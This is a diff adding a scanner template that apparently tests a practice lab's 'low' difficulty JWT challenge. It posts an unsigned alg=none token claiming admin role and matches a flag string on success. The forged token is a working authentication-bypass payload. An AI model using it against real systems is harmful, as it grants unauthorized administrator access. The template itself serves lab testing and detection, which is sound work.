@@ -1,0 +1,24 @@
+id: vulnlab-jwt-low
+
+info:
+  name: VulnLab JWT alg=none low 档
+  author: hediwen
+  severity: critical
+  tags: vulnlab,jwt
+
+http:
+  - raw:
+      - |
+        POST /jwt/low.php HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: application/x-www-form-urlencoded
+
+        action=verify&token=eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJ1c2VyIjoiYWxpY2UiLCJyb2xlIjoiYWRtaW4ifQ.
+    matchers-condition: and
+    matchers:
+      - type: status
+        status: [200]
+      - type: word
+        part: body
+        words:
+          - "VULNLAB{jwt_signature_bypass}"
